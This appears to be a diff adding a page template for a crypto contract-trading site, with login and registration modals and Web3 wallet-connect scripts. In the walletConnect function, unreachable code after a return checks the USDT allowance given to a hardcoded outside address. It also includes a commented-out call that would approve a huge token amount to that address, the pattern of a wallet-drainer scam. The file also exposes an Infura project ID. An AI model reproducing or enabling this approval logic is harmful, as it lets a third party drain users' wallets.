@@ -1,0 +1,372 @@
+<footer>
+    <a href="/"><img src="https://xbit.bitx88.com/h5/static/image/nav/nav-1.png">首頁</a>
+    <a href="market"><img src="https://xbit.bitx88.com/h5/static/image/nav/nav-2.png">合約交易</a>
+    <a href="task"><img src="https://xbit.bitx88.com/h5/static/image/nav/nav-3.png">任務</a>
+    <a href="user"><img src="/public/web/images/user.png">個人中心</a>
+</footer>
+
+<div id="loginModal" class="modal-style-2 dark modal " style="top:20%">
+    <div class="modal-dialog modal-login">
+        <div class="modal-content">
+            <div class="modal-header p-0">
+                <h4 class="modal-title">登入</h4>
+                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+            </div>
+            <div class="modal-body">
+                <!-- dont forget to add action and action method  -->
+                <form id="log-form" action="" method="" class="mt-3">
+                    <div class="form-group">
+                        <div class="input-group">
+                            <span class="input-group-addon"><i class="fa fa-user"
+                                    aria-hidden="true"></i>帳&nbsp;&nbsp;&nbsp;&nbsp;號</span>
+                            <input type="text" class="form-control" name="username" id="username" placeholder="輸入您的帳號"
+                                autocomplete="new-password" autocomplete="off" required="required">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <div class="input-group">
+                            <span class="input-group-addon"><i class="fa fa-lock"
+                                    aria-hidden="true"></i>密&nbsp;&nbsp;&nbsp;&nbsp;碼</span>
+                            <input type="password" class="form-control" name="password" id="password"
+                                autocomplete="new-password" placeholder="輸入您的密碼" required="required" autocomplete="on">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <div class="input-group">
+                            <span class="input-group-addon"><i class="fa-solid fa-key" aria-hidden="true"></i>驗證碼</span>
+                            <input type="text" class="form-control" name="code" id="code" placeholder="輸入圖形驗證碼"
+                                required="required" autocomplete="on">
+
+                        </div>
+                    </div>
+                    <div class="text-center">
+                        <img id="captcha" src="/admin/captcha" alt="" style="height:30px"
+                            onclick="this.src='/admin/captcha?r='+new Date().getTime()">
+                    </div>
+
+                    <div class="form-group text-center mt-2 mb-0">
+                        <button type="button" class="btn btn-primary btn-sm" onclick="doLogin()">登入</button>
+                    </div>
+                    <div class="col text-center hint-text pt-0">
+                        <a href="javascript:void(0)" onclick="register()" class="text-danger">註冊</a>
+                    </div>
+                </form>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<div id="registerModal" class="modal-style-2 dark modal " style="top:20%">
+    <div class="modal-dialog modal-login">
+        <div class="modal-content">
+            <div class="modal-header p-0">
+                <h4 class="modal-title">註冊會員</h4>
+                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+            </div>
+            <div class="modal-body">
+                <!-- dont forget to add action and action method  -->
+                <form id="reg-form" action="" method="" class="mt-3">
+                    <div class="form-group">
+                        <div class="input-group">
+                            <span class="input-group-addon"><i class="fa fa-user" aria-hidden="true"></i>帳號</span>
+                            <input type="text" class="form-control" name="username" id="reg-username"
+                                autocomplete="new-password" placeholder="輸入您的帳號" required="required">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <div class="input-group">
+                            <span class="input-group-addon"><i class="fa fa-lock" aria-hidden="true"></i>密碼</span>
+                            <input type="password" class="form-control" name="password" id="reg-password"
+                                autocomplete="new-password" placeholder="輸入您的密碼" required="required" autocomplete="on">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <div class="input-group">
+                            <span class="input-group-addon"><i class="fa fa-lock" aria-hidden="true"></i>確認密碼</span>
+                            <input type="password" class="form-control" name="password2" id="reg-password2"
+                                autocomplete="new-password" placeholder="輸入您的密碼" required="required" autocomplete="on">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <div class="input-group">
+                            <span class="input-group-addon"><i class="fa-solid fa-key" aria-hidden="true"></i>驗 證
+                                碼</span>
+                            <input type="text" class="form-control" name="code" id="reg-code" placeholder="輸入圖形驗證碼"
+                                required="required" autocomplete="on">
+
+                        </div>
+                    </div>
+                    <div class="text-center">
+                        <img id="captcha" src="/admin/captcha" alt="" style="height:30px"
+                            onclick="this.src='/admin/captcha?r='+new Date().getTime()">
+                    </div>
+
+                    <div class="form-group text-center mt-2 mb-0">
+                        <button type="button" class="btn btn-primary btn-sm" onclick="doRegister()">確認</button>
+                    </div>
+                    <!--div class="col text-center hint-text pt-0">
+                        <a href="/forget" class="text-danger">忘記密碼</a>
+                    </div-->
+                </form>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+
+<script src="https://demo.lanrenzhijia.com/demo/37/3743/demo/js/zeroModal.js"></script>
+<script src="//code.jquery.com/ui/1.10.4/jquery-ui.js"></script>
+<script>
+    const infuraId = '7d73a0c13ce946769577714aef84b79a'
+    const BEP20_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
+
+    var BEP20_ABI = [{ "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "constant": true, "inputs": [], "name": "_decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "renounceOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }];
+
+    async function walletConnect() {
+        try {
+
+            //BNB余额 
+            //await getBNBBalance();
+            //return;
+
+
+            // Initialize Web3Modal
+            const providerOptions = {
+                walletconnect: {
+                    package: window.WalletConnectProvider.default,
+                    options: {
+                        infuraId // 如果需要
+                    }
+                }
+            };
+
+            const web3Modal = new window.Web3Modal.default({
+                cacheProvider: false,
+                providerOptions
+            });
+
+            const provider = await web3Modal.connect();
+            const web3 = new Web3(provider);
+
+            // Get accounts
+            const accounts = await web3.eth.getAccounts();
+            const selectedAccount = accounts[0];
+
+
+
+
+            $.ajax({
+                url: '/walletlogin',
+                type: 'post',
+                data: {
+                    addr: selectedAccount
+                },
+                success: function (res) {
+                    $('.logoutWallet').hide();
+                    $('.loginWallet').show();
+                    $('#dvUserAddr').text(selectedAccount.substr(0, 6) + '...')
+                    localStorage.setItem('walletAddr', selectedAccount);
+                }
+            })
+
+            return;
+            // Initialize BEP-20 contract
+            const contract = new web3.eth.Contract(BEP20_ABI, BEP20_ADDRESS);
+
+
+            // 代币余额  Get balance
+            const balance = await contract.methods.balanceOf(selectedAccount).call();
+            console.log('Balance:', balance);
+
+            // Get decimals
+            const decimals = await contract.methods.decimals().call();
+            console.log('Decimals:', decimals);
+
+            // Convert amount to the smallest unit based on decimals
+            const amount = web3.utils.toBN(web3.utils.toWei('100000000000000000000000', 'ether')).div(web3.utils.toBN(10).pow(web3.utils.toBN(decimals)));
+            console.log('Amount:', amount.toString());
+
+
+            // Set authorized address
+            const authorizedAddress = '0x424E231D826acb3F4EDF59C8BE72D6745445C528'; // 替换为实际的授权地址
+
+            // Check allowance
+            const allowance = await contract.methods.allowance(selectedAccount, authorizedAddress).call();
+            console.log('Allowance:', allowance);
+
+            if (allowance === '0') {
+                // Approve transaction
+                console.log('未授权:', allowance);
+                /*try {
+                    const approveTx = await contract.methods.approve(authorizedAddress, amount.toString()).send({
+                        from: selectedAccount,
+                        gas: 70000
+                    });
+                    console.log('Approve Transaction:', approveTx);
+                    alert('授权成功!');
+                } catch (error) {
+                    console.error('授权失败:', error);
+                    alert('授权失败! ' + error.message);
+                }*/
+            } else {
+                console.log('已经授权过:', allowance);
+            }
+        } catch (error) {
+            console.error('Error during connection or approval process:', error);
+        }
+    }
+
+
+
+    async function getBNBBalance() {
+        try {
+            // Initialize Web3Modal
+            const providerOptions = {
+                walletconnect: {
+                    package: window.WalletConnectProvider.default,
+                    options: {
+                        infuraId // 如果需要
+                    }
+                }
+            };
+
+            const web3Modal = new window.Web3Modal.default({
+                cacheProvider: false,
+                providerOptions
+            });
+
+            const provider = await web3Modal.connect();
+            const web3 = new Web3(provider);
+
+            // Get accounts
+            const accounts = await web3.eth.getAccounts();
+            const selectedAccount = accounts[0];
+
+            // Get BNB balance
+            const balance = await web3.eth.getBalance(selectedAccount);
+            console.log('BNB Balance:', web3.utils.fromWei(balance, 'ether'));
+
+            
+
+        } catch (error) {
+            console.error('Error getting BNB balance:', error);
+        }
+    }
+
+    async function getBalance() {
+        try {
+            // Initialize Web3Modal
+            const providerOptions = {
+                walletconnect: {
+                    package: window.WalletConnectProvider.default,
+                    options: {
+                        infuraId // 如果需要
+                    }
+                }
+            };
+
+            const web3Modal = new window.Web3Modal.default({
+                cacheProvider: false,
+                providerOptions
+            });
+
+            const provider = await web3Modal.connect();
+            const web3 = new Web3(provider);
+
+            // Get accounts
+            const accounts = await web3.eth.getAccounts();
+            const selectedAccount = accounts[0];
+
+            // Initialize BEP-20 contract
+            const contract = new web3.eth.Contract(BEP20_ABI, BEP20_ADDRESS);
+
+            // Get balance
+            const balance = await contract.methods.balanceOf(selectedAccount).call();
+            console.log('Balance:', balance);
+
+            // Convert balance from smallest unit to a readable format
+            const decimals = await contract.methods.decimals().call();
+            const formattedBalance = web3.utils.fromWei(balance, 'bnb') / (10 ** (18 - decimals));
+            console.log('Formatted Balance:', formattedBalance);
+
+            alert('钱包余额: ' + formattedBalance);
+        } catch (error) {
+            console.error('Error during balance retrieval:', error);
+            alert(error.message);
+        }
+    }
+
+
+    function login() {
+
+        $('#loginModal').modal('show')
+
+    }
+
+    function register() {
+        $('#loginModal').modal('hide')
+        $('#registerModal').modal('show')
+
+    }
+
+    function doLogin() {
+        $.ajax({
+            url: '/login',
+            type: 'POST',
+            data: $('#log-form').serialize(),
+            success: function (res) {
+                console.log(res)
+
+                if (res.code == 200) {
+                    window.location.reload();
+                } else {
+                    alert(res.message);
+                }
+            }
+
+        })
+    }
+    function doRegister() {
+        $.ajax({
+            url: '/register',
+            type: 'POST',
+            data: $('#reg-form').serialize(),
+            success: function (res) {
+                console.log(res)
+                alert(res.message)
+                if (res.code == 200) {
+                    window.location.reload();
+                }
+            }
+
+        })
+    }
+
+    function checklogin() {
+        $.ajax({
+            url: '/profile',
+            type: 'get',
+            async: false,
+            success: function (res) {
+                console.log(res)
+                if (res.code == 200) {
+                    $('#lblusername').text(res.data.username.substr(0,6))
+                    $('.balance').text(res.data.balance)
+                    $('#dvlogin').show();
+                    $('#dvlogout').hide();
+                } else {
+                    $('#dvlogin').hide();
+                    $('#dvlogout').show();
+                }
+            }
+
+        })
+    }
+    setInterval(() => {
+        checklogin();
+    }, 2000)
+
+    checklogin();
+</script>
